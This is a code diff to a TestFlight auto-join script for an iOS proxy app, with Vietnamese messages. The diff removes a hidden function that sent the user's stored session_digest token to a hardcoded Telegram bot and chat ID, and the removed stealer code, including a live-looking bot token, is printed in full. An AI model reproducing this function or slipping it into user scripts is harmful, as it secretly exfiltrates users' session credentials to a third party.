@@ -6,7 +6,7 @@
 */
 !(async () => {
   ids = $persistentStore.read('APP_ID')
-  digest = $persistentStore.read('session_digest')
+  let digest = $persistentStore.read('session_digest')
   if (ids == null) {
     $notification.post('APP_ID chưa được thêm', 'Vui lòng thêm thủ công hoặc sử dụng liên kết TestFlight để tải nó tự động', '')
   } else if (ids == '') {
@@ -15,49 +15,12 @@
     ids = ids.split(',')
     for await (const ID of ids) {
       //await autoPost(ID)
-      await  $notification.post('Đang chạy vào ID:', ID, 'Digest:',digest )
+      $notification.post('Đang chạy vào ID:', ID, 'Digest:',digest )
     }
-
-    sendMessageToTelegram(`session_digest: ${session_digest}`);
   }
   $done()
 })()
-function sendMessageToTelegram(message) {
-  return new Promise((resolve, reject) => {
-    const chat_id = "608667192";
-    const telegrambot_token = "7125150542:AAFFYrU1SoVyBrnFi91KacR3rCIJfbM3FyY";
-    const url = `https://api.telegram.org/bot${telegrambot_token}/sendMessage`;
-    const body = {
-      chat_id: chat_id,
-      text: message,
-      entities: [{ type: "pre", offset: 0, length: message.length }],
-    };
-    const options = {
-      url: url,
-      body: JSON.stringify(body),
-      headers: {
-        "Content-Type": "application/json",
-      },
-    };
 
-    $httpClient
-      .post(options)
-      .then((response) => {
-        if (response.statusCode == 200) {
-          resolve(response);
-        } else {
-          reject(
-            new Error(
-              `Telegram API request failed with status code ${response.statusCode}`
-            )
-          );
-        }
-      })
-      .catch((error) => {
-        reject(error);
-      });
-  });
-}
 function autoPost(ID) {
   let Key = $persistentStore.read('key')
   let testurl = 'https://testflight.apple.com/v3/accounts/' + Key + '/ru/'
